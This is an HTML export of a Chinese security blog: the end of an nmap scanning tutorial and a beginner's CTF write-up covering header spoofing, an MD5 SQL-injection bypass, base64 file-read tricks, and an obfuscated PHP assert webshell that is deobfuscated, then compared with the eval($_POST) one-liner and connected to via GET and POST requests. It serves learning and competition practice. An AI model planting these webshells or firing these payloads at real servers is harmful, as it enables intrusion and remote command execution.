ssh</span><br><span class="line">999/tcp  open  garcon</span><br><span class="line">1022/tcp open  exp2</span><br><span class="line">3306/tcp open  mysql</span><br></pre></td></tr></table></figure>

<h2 id="扫描多个目标"><a href="#扫描多个目标" class="headerlink" title="扫描多个目标"></a>扫描多个目标</h2><h3 id="命令行中分别指定"><a href="#命令行中分别指定" class="headerlink" title="命令行中分别指定"></a>命令行中分别指定</h3><p>示例:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~# nmap 192.168.1.1 192.168.1.101 192.168.1.105</span><br><span class="line">Starting Nmap 6.47 ( http://nmap.org ) at 2015-05-05 19:07 CST</span><br><span class="line">Nmap scan report for localhost (192.168.1.1)</span><br><span class="line">Host is up (0.00094s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT       STATE SERVICE</span><br><span class="line">80/tcp             open  http</span><br><span class="line">1900/tcp          open  upnp</span><br><span class="line">49152/tcp         open  unknown</span><br><span class="line">Nmap scan report for localhost (192.168.1.101)</span><br><span class="line">Host is up (0.0060s latency).</span><br><span class="line">All 1000 scanned ports on localhost (192.168.1.101) are closed</span><br><span class="line">Nmap scan report for localhost (192.168.1.105)</span><br><span class="line">Host is up (0.00038s latency).</span><br><span class="line">Not shown: 995 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">21/tcp      open  ftp</span><br><span class="line">22/tcp       open  ssh</span><br><span class="line">23/tcp      open  telnet</span><br><span class="line">111/tcp    open  rpcbind</span><br><span class="line">445/tcp    open  microsoft-ds</span><br><span class="line">Nmap done: 3 IP addresses (3 hosts up) scanned in 1.00 seconds</span><br></pre></td></tr></table></figure>

<p>Nmap 就会分别报告扫描的结果.</p>
<h3 id="逗号分隔"><a href="#逗号分隔" class="headerlink" title="逗号分隔"></a>逗号分隔</h3><p>使用简化符号来减少命令的长度.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.1,101,105</span><br></pre></td></tr></table></figure>

<p>这与上一个示例中的命令等效</p>
<h3 id="目标列表"><a href="#目标列表" class="headerlink" title="目标列表"></a>目标列表</h3><p>当有大量主机需要扫描时, 可以将目标IP地址写入进一个文本文件中.<br>语法 : <code>nmap -iL [文件路径]</code></p>
<h3 id="范围扫描"><a href="#范围扫描" class="headerlink" title="范围扫描"></a>范围扫描</h3><p>指定扫描范围时, 可以通过IP地址或子网的方式来实现. </p>
<h4 id="IP地址指定扫描范围"><a href="#IP地址指定扫描范围" class="headerlink" title="IP地址指定扫描范围"></a>IP地址指定扫描范围</h4><p>语法 : <code>nmap [IP地址范围]</code></p>
<ul>
<li><p>示例一 : 扫描192.168.1.1-192.168.1.100之间的所有主机 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.1-100</span><br></pre></td></tr></table></figure>
</li>
<li><p>示例二 : 扫描C类IP网络192.168.1.*到192.168.100.*之间的所有主机</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1-100.*</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>星号<code>*</code>是通配符, 表示0-255之间所有有效的主机.</p>
<h4 id="子网扫描"><a href="#子网扫描" class="headerlink" title="子网扫描"></a>子网扫描</h4><p>Nmap也可以使用CIDR（无类别域间路由，Classless Inter-Domain Routing）格式来扫描整个子网。CIDR将多个IP网络结合在一起，使用一种无类别的域际路由选择算法，可以减少由核心路由器运载的路由选择信息的数量。其中，语法格式如下所示：<br><code>nmap [CIDR格式的网络地址]</code></p>
<p>示例 : 扫描192.168.1.1/24整个子网中的所有主机</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.1/24</span><br></pre></td></tr></table></figure>

<h2 id="排除扫描目标"><a href="#排除扫描目标" class="headerlink" title="排除扫描目标"></a>排除扫描目标</h2><p>当我们指定范围扫描的时候, 可能会把自己的IP地址包含在内, 如果出于种种原因不想扫描这些目标, 可以将它们排除.<br>语法 : <code>nmap [目标] --exclude [目标]</code></p>
<h2 id="简单参数"><a href="#简单参数" class="headerlink" title="简单参数"></a>简单参数</h2><ul>
<li><code>-p[a-b]</code> : 指定扫描端口a至b(a b均小于65535)</li>
<li><code>-p-</code> : 扫描全部端口.</li>
<li><code>-sP</code> : Ping扫描。 仅仅 进行ping扫描 (主机发现)，然后打印出对扫描做出响应的那些主机.</li>
<li><code>-sT</code> : TCP connect()扫描。当Nmap连接，然后不发送数据就关闭连接.</li>
<li><code>-sV</code> : 探测service版本.</li>
<li><code>-O -v</code> : 详细的操作系统探测.</li>
</ul>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://blog.csdn.net/qq_30247635/article/details/86247744#_14" target="_blank" rel="noopener">nmap简单参数教程</a></li>
<li><a href="https://blog.csdn.net/daxueba/article/details/46679439" target="_blank" rel="noopener">Nmap扫描教程之基础扫描详解</a></li>
</ul>
]]></content>
      
        
        <tags>
            
            <tag> 主机扫描 </tag>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF-writeup]]></title>
      <url>/2019/07/08/CTF-Writeup/</url>
      <content type="html"><![CDATA[<p>早期作品~~</p>
<a id="more"></a>
<h1 id="CTF-writeup"><a href="#CTF-writeup" class="headerlink" title="CTF writeup"></a>CTF writeup</h1><p>都是菜鸡总结的一些常识, dalao们请绕路(发抖)<br>但是也欢迎大佬们来纠正错误<br>菜鸡不胜感激</p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="localhost-resolved"><a href="#localhost-resolved" class="headerlink" title="localhost(resolved)"></a><a href="http://web.jarvisoj.com:32774/" target="_blank" rel="noopener">localhost</a>(resolved)</h3><p>题目中只有一行 <strong>localhost access only!!</strong><br><a href="https://link.jianshu.com/?t=http://www.111cn.net/phper/php-cy/59523.htm" target="_blank" rel="noopener">PHP获取用户IP地址</a><br>所以需要伪造自己的IP地址<br>一个比较简单的方法是在HTTP的请求头中添加参数:<code>X-Forwarded-For : 需要伪造的IP</code><br>可以使用burp suite抓包或PostMan来实现</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/X-Forwarded-For.png" alt title class>
                <p></p>
            </figure>
<p>类似的, 可以伪造<code>Referer</code><br><code>Referer</code>表明了用户是从哪个页面跳转来的.<br>例如<br><code>Referer: https://www.google.com</code></p>
<h3 id="admin-resolved"><a href="#admin-resolved" class="headerlink" title="admin(resolved)"></a><a href="http://web.jarvisoj.com:32792/" target="_blank" rel="noopener">admin</a>(resolved)</h3><p>进入网页只有一个hello world<br>查看网页代码,没有线索<br>尝试robots.txt,网页跳转,但是出现了一个假flag<br>burp suite抓包, 修改参数admin = 1,follow后出现真的flag</p>
<h3 id="login-working"><a href="#login-working" class="headerlink" title="login(working)"></a><a href="http://web.jarvisoj.com:32772/" target="_blank" rel="noopener">login</a>(working)</h3><p>进入题目只有一个登陆框，<br>右键源码，发现密码校验不在本地，<br>使用BurpSuite在后台密码爆破，<br>同时尝试使用 sql 注入<br>输入 <code>1&#39;or&#39;1&#39;or&#39;1</code>,<br>得到一个奇怪的响应,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /opt/lampp/htdocs/index.php on line 14</span><br><span class="line">Wrong Password.</span><br></pre></td></tr></table></figure>

<p>正当百思不得其解时,<br>查看下爆破时的 response 包,竟然有提示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint: &quot;select * from `admin` where password=&apos;&quot;.md5($pass,true).&quot;&apos;&quot;</span><br></pre></td></tr></table></figure>

<p>关于md5(string,raw)函数:</p>
<ul>
<li>string必需, 规定要计算的字符串</li>
<li>raw可选, 规定十六进制或二进制输出格式(TRUE或FALSE)</li>
</ul>
<p>2019/7/4日 补充:<br>原来hint里已经说的很清楚了, 就是先把我们的参数md5加密后再执行查询.<br>如果我们想构造payload, 需要使 md5($pass,true) 的结果中出现 <code>&#39;or&#39;</code> , 才可能绕过.<br>针对这个问题, 已经有了现成的payload – <code>ffifdyop</code><br>这是因为 :<br>MD5(‘ffifdyop’) =&gt; <code>276f722736c95d99e921722cf9ed621c</code>  #md5加密<br><code>276f722736c95d99e921722cf9ed621c</code> =&gt;  ‘or’6&lt;乱码&gt;     #转为字符串</p>
<h3 id="神盾局的秘密-working"><a href="#神盾局的秘密-working" class="headerlink" title="神盾局的秘密(working)"></a><a href="http://web.jarvisoj.com:32768/" target="_blank" rel="noopener">神盾局的秘密</a>(working)</h3><p>进入题目, 在开发者工具中发现有代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>传给img的参数是被base64加密过了,<br>所以如果我们想利用这个参数搞事,也必须先用base64加密</p>
<p>首先对 <code>index.php</code> 加密得到 <code>aW5kZXgucGhw</code><br>将它作为参数传给URL:<br><code>http://web.jarvisoj.com:32768/showimg.php?img=aW5kZXgucGhw</code><br>返回的页面中有代码 :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?php </span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br><span class="line">	$x = <span class="keyword">new</span> Shield();</span><br><span class="line">	<span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">		$x = unserialize($g);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">echo</span> $x---&gt;</span><br></pre></td></tr></table></figure>

<p>既然从url中看出有个文件名字叫<code>showimg.php</code>, 以同样的方法将其作为参数,访问url:<code>http://web.jarvisoj.com:32768/showimg.php?img=c2hvd2ltZy5waHA=</code><br>也有代码 :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?php</span><br><span class="line">	$f = $_GET[<span class="string">'img'</span>];</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($f)) &#123;</span><br><span class="line">		$f = base64_decode($f);</span><br><span class="line">		<span class="keyword">if</span> (stripos($f,<span class="string">'..'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'\\'</span>)===<span class="keyword">FALSE</span></span><br><span class="line">		&amp;&amp; stripos($f,<span class="string">'pctf'</span>)===<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">			readfile($f);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"File not found!"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?--&gt;</span><br></pre></td></tr></table></figure>

<p>然而暂时还不懂代码的逻辑, 回来再说</p>
<h3 id="IN-A-MESS-working"><a href="#IN-A-MESS-working" class="headerlink" title="IN A MESS(working)"></a><a href="http://web.jarvisoj.com:32780/index.phps" target="_blank" rel="noopener">IN A MESS</a>(working)</h3><p>进入题目只有一句 <code>work harder!harder!harder!</code><br>观察url有个参数id,不管怎样,<br>先后台爆着再说.<br>然而并没有什么卵用.<br>看response包里,有个index.phps <em>一开始我根本没看出来和index.php不一样</em> :/<br>访问,有如下代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;!--index.phps--&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>])</span><br><span class="line">&#123;</span><br><span class="line">	header(<span class="string">'Location: index.php?id=1'</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Hahahahahaha'</span>;</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">if</span>($data==<span class="string">"1112 is a nice lab!"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">require</span>(<span class="string">"flag.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"work harder!harder!harder!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>构造payload比较复杂, 回再说吧</p>
<p><a href="https://www.cnblogs.com/baifan2618/p/7815090.html" target="_blank" rel="noopener">参考</a></p>
<h3 id="PORT51-resolved"><a href="#PORT51-resolved" class="headerlink" title="PORT51(resolved)"></a><a href="http://web.jarvisoj.com:32770/" target="_blank" rel="noopener">PORT51</a>(resolved)</h3><p>根据题目, 应该是需要以指定的51端口访问.<br>在本地cmd</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --local-port 51 http://web.jarvisoj.com:32770/</span><br></pre></td></tr></table></figure>

<p>并没有什么卵用, 得到的响应和在浏览器上没区别,<br>但是使用服务器, 输入同样的命令可以成功, 暂时存疑<br>反正,<br>flag 拿到了对吧 :(</p>
<h3 id="TSCTF-resolved"><a href="#TSCTF-resolved" class="headerlink" title="TSCTF(resolved)"></a>TSCTF(resolved)</h3><figure class="image-box">
                <img src="http://188.131.227.20:999/picture/TSCTF.jpeg" alt title class>
                <p></p>
            </figure>

<p>这应该算是我第一次参见比较正式的CTF线下赛吧</p>
<p>能得奖基本就是靠抱大腿</p>
<p>没什么想多说的</p>
<p>只希望明年这天</p>
<p>我是D.I.E的主力</p>
<h4 id="流量监听"><a href="#流量监听" class="headerlink" title="流量监听"></a>流量监听</h4><p>打算在比赛时可以通过监听工具,抓取自家服务器的流量,<br>就算题目没有头绪, 还可以分析一波别人的 payload.</p>
<p><strong>tshark</strong><br>需要先自行安装一下.<br><strong>基本每个命令都需要root权限<code>sudo</code></strong></p>
<ul>
<li>显示可用网卡 <code>tshark -D</code></li>
<li>抓包  使用命令 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tshark  -c [数字]  -w [文件名.pcap] -f [捕获过滤器]</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">+ -c 表示抓多少包后停止</span><br><span class="line">+ -w 把抓包结果输入到文件中, 无需提前创建, 若目录下没有, 自动创建</span><br><span class="line">+ -f 设置捕获过滤器, 我们此处主要针对http的数据包, 所以参数设定为 &quot;port 80&quot;</span><br><span class="line"></span><br><span class="line">但是根据我的试验, 凡是使用tshark后产生的文件权限都十分敏感, 没法用finalshell 直接下载, 为了方便起见, 再补充使用 tcpdump 的方法</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>tcpdump -s  [数字]  -w [文件.pcap] port [端口数]</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">+ -s 表示一个包截断的长度, 0表示不截断, 完整的保存下来</span><br><span class="line">+ -w 输入到文件</span><br><span class="line">+ port 监听的端口</span><br><span class="line"></span><br><span class="line">**使用 tcpdump 同样需要sudo**</span><br><span class="line">然而这场比赛没有root权限, 自然也就没法用sudo, 我, , ,</span><br><span class="line"></span><br><span class="line">#### 自动提交 flag 的 python 脚本</span><br><span class="line"></span><br><span class="line">```py</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">def submit(flag, token):                           # 定义函数 submit</span><br><span class="line">	url = &quot;wangzhi&quot;                            # 需要设置的参数  url</span><br><span class="line">	pos = &#123;                                    # 字典，python的一种可变容器模型</span><br><span class="line">	    &quot;flag&quot;:flag,</span><br><span class="line">	    &quot;token&quot;:token</span><br><span class="line">	&#125;                                          # 所以 pos[&quot;flag&quot;] = flag</span><br><span class="line">	print &quot;[+] Submiting flag : [%s]&quot; % (pos)  # 格式化输出 pos</span><br><span class="line">	response = requests.post(url,data=pos)     # response 接收 request.post()返回的对象(?),其有许多数据域</span><br><span class="line">	content = response.content                 # content 接收 response的数据域content, 二进制数据</span><br><span class="line">	print &quot;[+] Content : %s &quot; % (content)      # 格式化输出content</span><br><span class="line">	if failed in content:                      # 若成功提交, 返回True,反之返回False</span><br><span class="line">		print &quot;[-]failed&quot;</span><br><span class="line">		return False</span><br><span class="line">	else:</span><br><span class="line">		print &quot;[+] Success!&quot;            </span><br><span class="line">		return True</span><br></pre></td></tr></table></figure>

<p>然而目前我的python环境还有点问题, 暂时没法正常运行<br>装了python3, 又装python2<br>装python一时爽,<br>一直装一直爽 😭</p>
<h4 id="第一个漏洞"><a href="#第一个漏洞" class="headerlink" title="第一个漏洞"></a>第一个漏洞</h4><p>开局登陆进主机后, 迅速使用下载整个网络目录到本地<br>D盾扫描出一个高危文件!<code>.202cb962ac59075b964b07152d234b70.ini.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@$_=<span class="string">'s'</span>.<span class="string">'s'</span>.<span class="comment">/*-/*-*/</span><span class="string">'e'</span>.<span class="comment">/*-/*-*/</span><span class="string">'r'</span>;</span><br><span class="line">@$_=<span class="comment">/*-/*-*/</span><span class="string">'a'</span>.<span class="comment">/*-/*-*/</span>$_.<span class="comment">/*-/*-*/</span><span class="string">'t'</span>;</span><br><span class="line">@$_<span class="comment">/*-/*-*/</span>($<span class="comment">/*-/*-*/</span>&#123;<span class="string">'_P'</span>.<span class="comment">/*-/*-*/</span><span class="string">'OS'</span>.<span class="comment">/*-/*-*/</span><span class="string">'T'</span>&#125;</span><br><span class="line">[<span class="comment">/*-/*-*/</span><span class="number">0</span><span class="comment">/*-/*-*/</span>+<span class="comment">/*-/*-*/</span><span class="number">3</span><span class="comment">/*-/*-*/</span>+<span class="comment">/*-/*-*/</span><span class="number">3</span><span class="comment">/*-/*-*/</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个文件当时没有看懂，但是现在经过学长的指点有点清晰了<br>其实代码中有着大量的障眼法<br>首先是大量的注释，把它们去掉后</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@$_=<span class="string">'s'</span>.<span class="string">'s'</span>.<span class="string">'e'</span>.<span class="string">'r'</span>;</span><br><span class="line">@$_=<span class="string">'a'</span>.$_.<span class="string">'t'</span>;</span><br><span class="line">@$_($&#123;<span class="string">'_P'</span>.<span class="string">'OS'</span>.<span class="string">'T'</span>&#125;</span><br><span class="line">[<span class="number">0</span>+<span class="number">3</span>+<span class="number">3</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>其实这里看出仍有很多拼接运算在阻碍我们分析,<br>我们直接写出拼接后的结果</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@$_=<span class="string">'assert'</span>;</span><br><span class="line">@$_($&#123;<span class="string">'_POST'</span>&#125;[<span class="number">6</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们看到,这两行代码中都有变量<code>$_</code>,<br>起初我不知道这是什么意思, 其实就是相当于文本的替换<br>因为<code>$_</code>存放的是字符串, 所以php的解释器在分析时也仅仅是把内容原封不动的放在这里<br>那么这段代码就是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @assert($_POST[<span class="number">6</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>而一句话木马<code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code><br>其中assert()和eval()的效果类似<br>所以这个文件里就是暗藏一句话木马!</p>
<h4 id="一句话木马的原理"><a href="#一句话木马的原理" class="headerlink" title="一句话木马的原理"></a>一句话木马的原理</h4><p>之前使用一句话木马也有好几次了,<br>但是基本都是用菜刀直连, 却对它的原理不甚了解.<br>借这个机会赶紧把php的一些细节上的东西搞清楚.</p>
<p>常见的一句话木马</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>eval()函数</strong> : 会把里面的变量当成php代码来执行.<br>如果说 <code>$_post[&#39;cmd&#39;]</code> 此时的值是<code>print &#39;hello world&#39;</code>, 那么它运行起来的回显就是<code>hello world</code><br>如果<code>%_post[&#39;cmd&#39;]</code>的值是<code>system(&#39;cat flag&#39;)</code>, 那么在服务器端就会执行<code>cat flag</code>命令并在浏览器上回显<br>也就是说, 连接上了一句话, 你就可以用这个函数随便<del>做爱做的事情</del>搞事, 前提是有足够的权限</p>
</li>
<li><p><strong>$_post[‘cmd’]</strong> : 一句话的目的是执行我们的命令, 那么它就需要一个变量来接收我们传来的数据, $_post[‘cmd’]就是干这个的, 它会从http的POST数据包中接收一个名为<code>cmd</code>的参数.<br>问题是, 如果这个一句话木马是别人植入的, 那我就不知道这个参数的名字是什么, 也就无法正确的<del>做爱做的事</del>传参. 所以这里的参数名又起到了密码的作用, 让我们的一句话只为自己所用.</p>
</li>
<li><p><strong>@</strong> 符号的作用是 : 如果代码错误执行, 不把报错信息显示出来.<br>为什么要这样做呢? 因为假如我们不传参数执行代码, 那么服务器就会善意的报错:</p>
<blockquote>
<p>Notice，你的cmd变量没有定义。</p>
</blockquote>
<p>于是密码就被服务器暴露了.<br>@ 就可以避免这种尴尬的场面</p>
</li>
</ul>
<p>其实我觉得上来就用菜刀控制一句话木马并不好,<br>因为这个工具把底层的东西都封装好了.<br>我深信, 要想真正理解某样东西, 越接近底层, 越有助于深入.<br>所以要先学会<strong>使用浏览器连接一句话木马</strong></p>
<p>在比赛的时候, 见到学长在url上设置payload,<br>所以我想设置url的payload连接一句话,<br><code>http://whoisyourdaddy.cf/test.php?cmd=system(&#39;ls&#39;);</code><br>按照我们上面的分析, php代码就会执行<code>system(&#39;ls&#39;);</code>, 回显出目录下的文件.<br>(一定不要忘记后面的 <code>;</code>血的教训😭)<br><font size="5"><strong>然而 :</strong></font></p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/kongkongde.png" alt title class>
                <p></p>
            </figure>

<p>这是因为, <strong>$_post根本不接收用GET方法传来的参数!</strong><br>$_post只接收使用POST方法接受的表单数据.</p>
<p>简单起见, 我们先用url作为payload, 那么, 需要把代码改成</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问一下.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/ls.png" alt title class>
                <p></p>
            </figure>
<p>成功了.</p>
<p>同理, 要想使用POST方法传递数据, 可以用</p>
<ul>
<li>Chrome 的插件 Hackbar</li>
<li>Burp Suite change method</li>
<li>Post man 生成 payload</li>
</ul>
<p>我成功的使用Burp 的 change method 功能和 PostMan 实现了.<br>postman的使用有些坑要注意, 如图</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/postman.png" alt title class>
                <p></p>
            </figure>
<h4 id="POST和GET数据包的对比"><a href="#POST和GET数据包的对比" class="headerlink" title="POST和GET数据包的对比"></a>POST和GET数据包的对比</h4><p>GET:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /test.php?cmd=system(%27ls%27); HTTP/1.1</span><br><span class="line">Host: whoisyourdaddy.cf</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>POST:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /test.php HTTP/1.1</span><br><span class="line">Host: whoisyourdaddy.cf</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span 